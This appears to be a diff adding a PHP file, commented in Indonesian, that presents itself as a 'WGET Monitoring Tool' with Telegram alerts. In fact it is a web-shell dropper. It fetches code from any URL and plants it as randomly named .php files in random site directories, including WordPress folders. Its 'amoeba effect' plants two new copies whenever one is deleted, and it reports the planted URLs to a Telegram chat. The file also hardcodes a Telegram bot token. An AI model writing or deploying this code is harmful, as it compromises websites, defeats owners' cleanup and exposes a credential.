@@ -1,0 +1,921 @@
+<?php
+// Konfigurasi Bot Telegram
+define('BOT_TOKEN', '7971692177:AAFIzKiPI7_Jtudm8SFJJk5KaZ3VfxAh3Zc');
+define('API_URL', 'https://api.telegram.org/bot' . BOT_TOKEN . '/');
+
+// File untuk menyimpan status monitoring
+define('STATE_FILE', 'wget_state.json');
+define('LOG_FILE', 'wget_activity.log');
+
+// Class untuk efek background Matrix
+class MatrixBackground {
+    private $chars;
+    
+    public function __construct() {
+        // Karakter untuk efek Matrix (angka, huruf latin, huruf Jepang)
+        $this->chars = array_merge(
+            range(0, 9),
+            range('A', 'Z'),
+            range('a', 'z'),
+            ['ア','イ','ウ','エ','オ','カ','キ','ク','ケ','コ','サ','シ','ス','セ','ソ','タ','チ','ツ','テ','ト','ナ','ニ','ヌ','ネ','ノ']
+        );
+    }   
+    
+    public function generate() {
+        $output = "<div class='matrix-bg'>";
+        for ($i = 0; $i < 200; $i++) {
+            $char = $this->chars[array_rand($this->chars)];
+            $style = "top: " . rand(0, 100) . "%; left: " . rand(0, 100) . "%; animation-delay: " . (rand(0, 20)/10) . "s;";
+            $output .= "<span class='matrix-char' style='$style'>$char</span>";
+        }
+        $output .= "</div>";
+        return $output;
+    }
+}
+
+// Class utama untuk monitoring WGET
+class WgetMonitor {
+    private $state;
+    private $basePath;
+    private $domain;
+    
+    public function __construct() {
+        $this->basePath = realpath(dirname(__FILE__));
+        $this->domain = $this->getCurrentDomain();
+        $this->loadState();
+        $this->checkFiles();
+    }
+    
+    public function getBasePath() {
+        return $this->basePath;
+    }
+    
+    public function getCurrentDomain() {
+        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
+        return $protocol . $_SERVER['HTTP_HOST'];
+    }
+    
+    private function loadState() {
+        if (file_exists(STATE_FILE)) {
+            $this->state = json_decode(file_get_contents(STATE_FILE), true);
+        }
+        
+        if (empty($this->state)) {
+            $this->state = [
+                'monitored_domains' => [],
+                'active_processes' => [],
+                'file_registry' => [],
+                'deleted_files' => []
+            ];
+        }
+    }
+    
+    private function saveState() {
+        file_put_contents(STATE_FILE, json_encode($this->state, JSON_PRETTY_PRINT));
+    }
+    
+    public function logActivity($message) {
+        $timestamp = date('Y-m-d H:i:s');
+        file_put_contents(LOG_FILE, "[$timestamp] $message\n", FILE_APPEND);
+    }
+    
+    public function generateRandomName() {
+        $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_';
+        $name = '';
+        for ($i = 0; $i < 9; $i++) {
+            $name .= $chars[mt_rand(0, strlen($chars) - 1)];
+        }
+        return $name . '.php';
+    }
+    
+    // Fungsi untuk mendapatkan semua direktori dalam website
+    private function getAllDirectories($path = null, $maxDepth = 5, $currentDepth = 0) {
+        if ($currentDepth >= $maxDepth) return [];
+        
+        $directories = [];
+        $path = $path ?: $this->basePath;
+        
+        if (!is_dir($path)) return [];
+        
+        $items = @scandir($path);
+        if ($items === false) return [];
+        
+        foreach ($items as $item) {
+            if ($item == '.' || $item == '..') continue;
+            
+            $fullPath = $path . DIRECTORY_SEPARATOR . $item;
+            if (is_dir($fullPath)) {
+                // Skip direktori yang tidak boleh diakses
+                if (in_array($item, ['node_modules', 'vendor', '.git', '.idea', 'cgi-bin'])) continue;
+                
+                $relativePath = str_replace($this->basePath, '', $fullPath);
+                // Normalisasi path untuk web
+                $webPath = str_replace(DIRECTORY_SEPARATOR, '/', $relativePath);
+                
+                $directories[] = $webPath;
+                
+                // Rekursif untuk subdirektori
+                $subDirs = $this->getAllDirectories($fullPath, $maxDepth, $currentDepth + 1);
+                $directories = array_merge($directories, $subDirs);
+            }
+        }
+        
+        return $directories;
+    }
+    
+    public function executeWget($url, $chatId) {
+        // Dapatkan semua direktori yang tersedia
+        $allDirectories = $this->getAllDirectories();
+        if (empty($allDirectories)) {
+            $allDirectories = ['/', '/wp-admin/', '/wp-includes/', '/wp-content/'];
+        }
+        
+        // Generate random filename
+        $filename = $this->generateRandomName();
+        
+        // Simpan ke state
+        $this->state['monitored_domains'][$this->domain] = [
+            'chat_id' => $chatId,
+            'last_checked' => time(),
+            'target_url' => $url
+        ];
+        
+        $processId = uniqid('wget_', true);
+        $this->state['active_processes'][$processId] = [
+            'domain' => $this->domain,
+            'target_url' => $url,
+            'chat_id' => $chatId,
+            'start_time' => time(),
+            'status' => 'running'
+        ];
+        
+        $this->state['file_registry'][] = [
+            'domain' => $this->domain,
+            'filename' => $filename,
+            'paths' => [],
+            'created_at' => time(),
+            'chat_id' => $chatId,
+            'target_url' => $url
+        ];
+        
+        $this->saveState();
+        $this->logActivity("Started wget process for $url, chat ID: $chatId");
+        
+        // Download konten dari URL target
+        $fileContent = $this->downloadContent($url);
+        
+        // Buat file di berbagai direktori
+        $createdUrls = $this->createFilesInBackground($filename, $chatId, $allDirectories, $fileContent);
+        
+        return [
+            'process_id' => $processId,
+            'created_urls' => $createdUrls
+        ];
+    }
+    
+    private function downloadContent($url) {
+        $options = [
+            'http' => [
+                'method' => 'GET',
+                'header' => "User-Agent: WGET Monitoring Tool/1.0\r\n",
+                'timeout' => 15
+            ]
+        ];
+        
+        $context = stream_context_create($options);
+        $content = @file_get_contents($url, false, $context);
+        
+        if ($content === false) {
+            // Fallback content jika download gagal
+            $content = '<?php // WGET Monitoring Tool - File created automatically ?>';
+            $this->logActivity("Failed to download content from $url, using default content");
+        } else {
+            $this->logActivity("Successfully downloaded content from $url");
+        }
+        
+        return $content;
+    }
+    
+    private function createFilesInBackground($filename, $chatId, $directories, $fileContent) {
+        $createdUrls = [];
+        
+        // Pilih beberapa direktori secara acak (minimal 1, maksimal 5)
+        $selectedDirs = [];
+        $maxDirs = min(5, max(1, count($directories)));
+        if ($maxDirs > 0) {
+            $randomKeys = array_rand($directories, $maxDirs);
+            if (is_array($randomKeys)) {
+                foreach ($randomKeys as $key) {
+                    $selectedDirs[] = $directories[$key];
+                }
+            } else {
+                $selectedDirs[] = $directories[$randomKeys];
+            }
+        }
+        
+        foreach ($selectedDirs as $dir) {
+            // Pastikan path diawali dengan slash
+            $dir = '/' . ltrim($dir, '/');
+            
+            $fullPath = $this->basePath . $dir . '/' . $filename;
+            $dirPath = dirname($fullPath);
+            
+            // Buat direktori jika belum ada
+            if (!is_dir($dirPath)) {
+                mkdir($dirPath, 0755, true);
+            }
+            
+            // Buat file
+            if (file_put_contents($fullPath, $fileContent)) {
+                $fileUrl = $this->domain . $dir . '/' . $filename;
+                $createdUrls[] = $fileUrl;
+                
+                // Simpan path ke registry
+                foreach ($this->state['file_registry'] as &$file) {
+                    if ($file['filename'] === $filename && $file['domain'] === $this->domain) {
+                        $file['paths'][] = $dir;
+                        break;
+                    }
+                }
+                
+                $this->logActivity("Created file: $fullPath");
+            }
+        }
+        
+        $this->saveState();
+        
+        // Kirim notifikasi ke Telegram
+        if (!empty($createdUrls)) {
+            $message = "✅ WGET Process Completed\n";
+            $message .= "Target URL: " . $this->state['monitored_domains'][$this->domain]['target_url'] . "\n";
+            $message .= "Domain: $this->domain\n";
+            $message .= "Files created:\n";
+            
+            foreach ($createdUrls as $url) {
+                $message .= "$url\n";
+            }
+            
+            $this->sendTelegramMessage($chatId, $message);
+        }
+        
+        return $createdUrls;
+    }
+    
+    public function sendTelegramMessage($chatId, $message) {
+        $url = API_URL . "sendMessage";
+        $data = [
+            'chat_id' => $chatId,
+            'text' => $message,
+            'parse_mode' => 'HTML'
+        ];
+        
+        $options = [
+            'http' => [
+                'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
+                'method' => 'POST',
+                'content' => http_build_query($data),
+                'timeout' => 5
+            ]
+        ];
+        
+        $context = stream_context_create($options);
+        $result = @file_get_contents($url, false, $context);
+        
+        if ($result === false) {
+            $this->logActivity("Failed to send Telegram message to $chatId");
+            return false;
+        }
+        
+        return true;
+    }
+    
+    public function checkFiles() {
+        if (empty($this->state['file_registry'])) return;
+        
+        foreach ($this->state['file_registry'] as $index => &$file) {
+            $fileExists = false;
+            
+            // Periksa apakah file masih ada di semua path
+            foreach ($file['paths'] as $path) {
+                $fullPath = $this->basePath . $path . '/' . $file['filename'];
+                if (file_exists($fullPath)) {
+                    $fileExists = true;
+                    break;
+                }
+            }
+            
+            if (!$fileExists) {
+                $this->logActivity("File {$file['filename']} on {$file['domain']} was deleted");
+                
+                // Simpan informasi file yang terhapus
+                $this->state['deleted_files'][] = $file;
+                
+                // Hapus dari registry
+                unset($this->state['file_registry'][$index]);
+                
+                // Aktifkan efek amoeba - buat lebih banyak file
+                $this->amoebaEffect($file['domain'], $file['filename'], $file['chat_id'], $file['target_url']);
+            }
+        }
+        
+        // Reset array index
+        $this->state['file_registry'] = array_values($this->state['file_registry']);
+        $this->saveState();
+    }
+    
+    private function amoebaEffect($domain, $filename, $chatId, $targetUrl) {
+        $this->logActivity("Amoeba effect triggered for $filename on $domain");
+        
+        // Dapatkan semua direktori
+        $allDirectories = $this->getAllDirectories();
+        if (empty($allDirectories)) {
+            $allDirectories = ['/', '/wp-admin/', '/wp-includes/', '/wp-content/'];
+        }
+        
+        // Download ulang konten dari URL target
+        $fileContent = $this->downloadContent($targetUrl);
+        
+        // Buat 2 file baru untuk setiap file yang dihapus
+        for ($i = 0; $i < 2; $i++) {
+            $newFilename = $this->generateRandomName();
+            $createdUrls = $this->createFilesInBackground($newFilename, $chatId, $allDirectories, $fileContent);
+            
+            // Tambahkan ke registry
+            $this->state['file_registry'][] = [
+                'domain' => $domain,
+                'filename' => $newFilename,
+                'paths' => [],
+                'created_at' => time(),
+                'chat_id' => $chatId,
+                'target_url' => $targetUrl
+            ];
+        }
+        
+        $this->sendTelegramMessage(
+            $chatId,
+            "🔄 Amoeba Effect Activated\n" .
+            "Domain: $domain\n" .
+            "Deleted file: $filename\n" .
+            "2 new files have been created"
+        );
+        
+        $this->saveState();
+    }
+    
+    public function getStatus() {
+        return $this->state;
+    }
+    
+    public function processTelegramWebhook($update) {
+        if (isset($update['message']['text'])) {
+            $chatId = $update['message']['chat']['id'];
+            $text = $update['message']['text'];
+            
+            if ($text === '/start') {
+                $this->sendTelegramMessage(
+                    $chatId,
+                    "🤖 WGET Monitor Bot Activated\n\n" .
+                    "Send me a URL to start monitoring with wget. " .
+                    "I'll notify you when files are created and if any are deleted."
+                );
+            } elseif (filter_var($text, FILTER_VALIDATE_URL)) {
+                $result = $this->executeWget($text, $chatId);
+                $this->sendTelegramMessage(
+                    $chatId,
+                    "⏳ Starting wget process for: $text\n" .
+                    "Process ID: {$result['process_id']}\n" .
+                    "You will receive notifications when files are created."
+                );
+            } else {
+                $this->sendTelegramMessage(
+                    $chatId,
+                    "Please send a valid URL to start monitoring."
+                );
+            }
+        }
+        
+        return true;
+    }
+}
+
+// Inisialisasi tool
+$wgetMonitor = new WgetMonitor();
+$matrixBg = new MatrixBackground();
+
+// Handle Telegram webhook
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST)) {
+    $input = file_get_contents('php://input');
+    $update = json_decode($input, true);
+    
+    if ($update) {
+        $wgetMonitor->processTelegramWebhook($update);
+        exit;
+    }
+}
+
+// Handle form submission dari web interface
+$message = '';
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['url'])) {
+    $url = filter_input(INPUT_POST, 'url', FILTER_SANITIZE_URL);
+    $chatId = filter_input(INPUT_POST, 'chat_id', FILTER_SANITIZE_STRING);
+    
+    if (filter_var($url, FILTER_VALIDATE_URL) && !empty($chatId)) {
+        $result = $wgetMonitor->executeWget($url, $chatId);
+        $message = "WGET process started with ID: " . $result['process_id'];
+    } else {
+        $message = "Invalid URL or Chat ID provided";
+    }
+}
+
+// Dapatkan status saat ini
+$status = $wgetMonitor->getStatus();
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WGET Monitoring Tool</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Courier New', monospace;
+            background-color: #000;
+            color: #0f0;
+            overflow-x: hidden;
+            position: relative;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+            z-index: 10;
+        }
+        
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            opacity: 0.1;
+            pointer-events: none;
+            overflow: hidden;
+        }
+        
+        .matrix-char {
+            position: absolute;
+            color: #0f0;
+            font-size: 16px;
+            animation: fall 10s linear infinite;
+            opacity: 0.8;
+        }
+        
+        @keyframes fall {
+            0% {
+                transform: translateY(-100%);
+                opacity: 0;
+            }
+            5% {
+                opacity: 0.8;
+            }
+            95% {
+                opacity: 0.8;
+            }
+           100% {
+                transform: translateY(100vh);
+                opacity: 0;
+            }
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 30px;
+            border: 2px solid #0f0;
+            border-radius: 10px;
+            background-color: rgba(0, 30, 0, 0.2);
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .logo {
+            font-size: 42px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            text-shadow: 0 0 15px #0f0, 0 0 25px #0f0;
+            letter-spacing: 3px;
+            color: #0f0;
+        }
+        
+        .subtitle {
+            font-size: 20px;
+            opacity: 0.9;
+            margin-bottom: 10px;
+        }
+        
+        .description {
+            font-size: 16px;
+            opacity: 0.7;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        .panel {
+            background-color: rgba(0, 30, 0, 0.2);
+            border: 1px solid #0f0;
+            border-radius: 8px;
+            padding: 25px;
+            margin-bottom: 25px;
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
+        }
+        
+        .panel-title {
+            font-size: 22px;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #0f0;
+            padding-bottom: 10px;
+            color: #0f0;
+            text-shadow: 0 0 5px #0f0;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #0f0;
+        }
+        
+        input[type="text"] {
+            width: 100%;
+            padding: 12px 15px;
+            background-color: #001a00;
+            border: 1px solid #0f0;
+            color: #0f0;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            font-size: 16px;
+            box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.5);
+            transition: all 0.3s;
+        }
+        
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #0f0;
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.5), inset 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+        
+        button {
+            background: linear-gradient(to bottom, #003300, #001100);
+            color: #0f0;
+            border: 1px solid #0f0;
+            padding: 12px 25px;
+            cursor: pointer;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            font-size: 16px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.3s;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
+        }
+        
+        button:hover {
+            background: linear-gradient(to bottom, #004400, #002200);
+            box-shadow: 0 0 15px #0f0;
+            transform: translateY(-2px);
+        }
+        
+        .status-list {
+            list-style-type: none;
+        }
+        
+        .status-item {
+            padding: 15px;
+            border-bottom: 1px dashed #0f0;
+            transition: all 0.3s;
+            background-color: rgba(0, 20, 0, 0.1);
+        }
+        
+        .status-item:hover {
+            background-color: rgba(0, 50, 0, 0.2);
+        }
+        
+        .status-item:last-child {
+            border-bottom: none;
+        }
+        
+        .process-id {
+            font-weight: bold;
+            color: #0f0;
+            display: block;
+            margin-bottom: 5px;
+        }
+        
+        .url {
+            opacity: 0.9;
+            display: block;
+            margin-bottom: 5px;
+            word-break: break-all;
+            font-size: 14px;
+        }
+        
+        .chat-id {
+            opacity: 0.7;
+            font-size: 14px;
+        }
+        
+        .message {
+            padding: 15px;
+            margin: 15px 0;
+            border: 1px solid #0f0;
+            border-radius: 5px;
+            background-color: rgba(0, 40, 0, 0.3);
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.2);
+        }
+        
+        .success {
+            color: #0f0;
+            border-color: #0f0;
+        }
+        
+        .error {
+            color: #f00;
+            border-color: #f00;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #0f0;
+            opacity: 0.7;
+            font-size: 14px;
+        }
+        
+        .tab-container {
+            margin-top: 20px;
+        }
+        
+        .tab-buttons {
+            display: flex;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #0f0;
+        }
+        
+        .tab-btn {
+            padding: 12px 20px;
+            cursor: pointer;
+            border: 1px solid #0f0;
+            background-color: rgba(0, 30, 0, 0.2);
+            transition: all 0.3s;
+            margin-right: 5px;
+            border-radius: 5px 5px 0 0;
+        }
+        
+        .tab-btn.active {
+            background-color: rgba(0, 60, 0, 0.4);
+            box-shadow: inset 0 0 10px rgba(0, 255, 0, 0.3);
+            border-bottom: 1px solid rgba(0, 60, 0, 0.4);
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        .stats {
+            display: flex;
+            justify-content: space-around;
+            margin: 20px 0;
+            text-align: center;
+        }
+        
+        .stat-box {
+            flex: 1;
+            padding: 15px;
+            margin: 0 10px;
+            border: 1px solid #0f0;
+            border-radius: 5px;
+            background-color: rgba(0, 30, 0, 0.2);
+        }
+        
+        .stat-number {
+            font-size: 24px;
+            font-weight: bold;
+            color: #0f0;
+            display: block;
+        }
+        
+        .stat-label {
+            font-size: 14px;
+            opacity: 0.8;
+        }
+        
+        .domain-info {
+            background-color: rgba(0, 40, 0, 0.3);
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            border: 1px solid #0f0;
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                padding: 10px;
+            }
+            
+            .logo {
+                font-size: 28px;
+            }
+            
+            .stats {
+                flex-direction: column;
+            }
+            
+            .stat-box {
+                margin: 10px 0;
+            }
+            
+            .tab-buttons {
+                flex-direction: column;
+            }
+            
+            .tab-btn {
+                margin-bottom: 5px;
+                border-radius: 5px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <?php echo $matrixBg->generate(); ?>
+    
+    <div class="container">
+        <div class="header">
+            <div class="logo">WGET MONITOR</div>
+            <div class="subtitle">Advanced File Monitoring with Telegram Integration</div>
+            <div class="description">Download files with wget and monitor them across your domain. Receive instant notifications on Telegram.</div>
+        </div>
+        
+        <div class="domain-info">
+            <strong>Current Domain:</strong> <?php echo htmlspecialchars($wgetMonitor->getCurrentDomain()); ?><br>
+            <strong>Base Path:</strong> <?php echo htmlspecialchars($wgetMonitor->getBasePath()); ?>
+        </div>
+        
+        <?php if (!empty($message)): ?>
+        <div class="message <?php echo strpos($message, 'Invalid') !== false ? 'error' : 'success'; ?>">
+            <?php echo htmlspecialchars($message); ?>
+        </div>
+        <?php endif; ?>
+        
+        <div class="stats">
+            <div class="stat-box">
+                <span class="stat-number"><?php echo count($status['active_processes']); ?></span>
+                <span class="stat-label">Active Processes</span>
+            </div>
+            <div class="stat-box">
+                <span class="stat-number"><?php echo count($status['monitored_domains']); ?></span>
+                <span class="stat-label">Monitored Domains</span>
+            </div>
+            <div class="stat-box">
+                <span class="stat-number"><?php echo count($status['file_registry']); ?></span>
+                <span class="stat-label">Tracked Files</span>
+            </div>
+        </div>
+        
+        <div class="panel">
+            <div class="panel-title">Start WGET Process</div>
+            <form method="POST">
+                <div class="form-group">
+                    <label for="url">Target URL to WGET:</label>
+                    <input type="text" id="url" name="url" placeholder="https://example.com/file-to-download" required>
+                </div>
+                <div class="form-group">
+                    <label for="chat_id">Telegram Chat ID:</label>
+                    <input type="text" id="chat_id" name="chat_id" placeholder="123456789" required>
+                </div>
+                <button type="submit">Start WGET Process</button>
+            </form>
+        </div>
+        
+        <div class="tab-container">
+            <div class="tab-buttons">
+                <div class="tab-btn active" data-tab="processes">Active Processes</div>
+                <div class="tab-btn" data-tab="domains">Monitored Domains</div>
+                <div class="tab-btn" data-tab="files">Tracked Files</div>
+            </div>
+            
+            <div class="tab-content active" id="processes">
+                <div class="panel">
+                    <div class="panel-title">Active Processes</div>
+                    <?php if (!empty($status['active_processes'])): ?>
+                        <ul class="status-list">
+                            <?php foreach ($status['active_processes'] as $pid => $process): ?>
+                                <li class="status-item">
+                                    <span class="process-id"><?php echo htmlspecialchars($pid); ?></span>
+                                    <span class="url">Domain: <?php echo htmlspecialchars($process['domain']); ?></span>
+                                    <span class="url">Target: <?php echo htmlspecialchars($process['target_url']); ?></span>
+                                    <span class="chat-id">Chat ID: <?php echo htmlspecialchars($process['chat_id']); ?></span>
+                                    <span class="chat-id">Started: <?php echo date('Y-m-d H:i:s', $process['start_time']); ?></span>
+                                </li>
+                            <?php endforeach; ?>
+                        </ul>
+                    <?php else: ?>
+                        <p>No active processes</p>
+                    <?php endif; ?>
+                </div>
+            </div>
+            
+            <div class="tab-content" id="domains">
+                <div class="panel">
+                    <div class="panel-title">Monitored Domains</div>
+                    <?php if (!empty($status['monitored_domains'])): ?>
+                        <ul class="status-list">
+                            <?php foreach ($status['monitored_domains'] as $domain => $info): ?>
+                                <li class="status-item">
+                                    <strong><?php echo htmlspecialchars($domain); ?></strong>
+                                    <span class="url">Target URL: <?php echo htmlspecialchars($info['target_url']); ?></span>
+                                    <span class="chat-id">Chat ID: <?php echo htmlspecialchars($info['chat_id']); ?></span>
+                                    <span class="chat-id">Last checked: <?php echo date('Y-m-d H:i:s', $info['last_checked']); ?></span>
+                                </li>
+                            <?php endforeach; ?>
+                        </ul>
+                    <?php else: ?>
+                        <p>No domains being monitored</p>
+                    <?php endif; ?>
+                </div>
+            </div>
+            
+            <div class="tab-content" id="files">
+                <div class="panel">
+                    <div class="panel-title">Tracked Files</div>
+                    <?php if (!empty($status['file_registry'])): ?>
+                        <ul class="status-list">
+                            <?php foreach ($status['file_registry'] as $file): ?>
+                                <li class="status-item">
+                                    <strong><?php echo htmlspecialchars($file['filename']); ?></strong>
+                                    <span class="url">Domain: <?php echo htmlspecialchars($file['domain']); ?></span>
+                                    <span class="url">Source: <?php echo htmlspecialchars($file['target_url']); ?></span>
+                                    <span class="chat-id">Chat ID: <?php echo htmlspecialchars($file['chat_id']); ?></span>
+                                    <span class="chat-id">Created: <?php echo date('Y-m-d H:i:s', $file['created_at']); ?></span>
+                                    <?php if (!empty($file['paths'])): ?>
+                                        <span class="url">Paths: <?php echo implode(', ', array_slice($file['paths'], 0, 3)); ?></span>
+                                    <?php endif; ?>
+                                </li>
+                            <?php endforeach; ?>
+                        </ul>
+                    <?php else: ?>
+                        <p>No files being tracked</p>
+                    <?php endif; ?>
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            WGET Monitoring Tool &copy; 2023 | Running in background mode
+        </div>
+    </div>
+
+    <script>
+        // Tab functionality
+        document.querySelectorAll('.tab-btn').forEach(button => {
+            button.addEventListener('click', () => {
+                // Remove active class from all buttons and contents
+                document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+                document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
+                
+                // Add active class to clicked button
+                button.classList.add('active');
+                
+                // Show corresponding content
+                const tabId = button.getAttribute('data-tab');
+                document.getElementById(tabId).classList.add('active');
+            });
+        });
+        
+        // Auto-refresh page every 60 seconds
+        setTimeout(() => {
+            window.location.reload();
+        }, 60000);
+    </script>
+</body>
+</html>
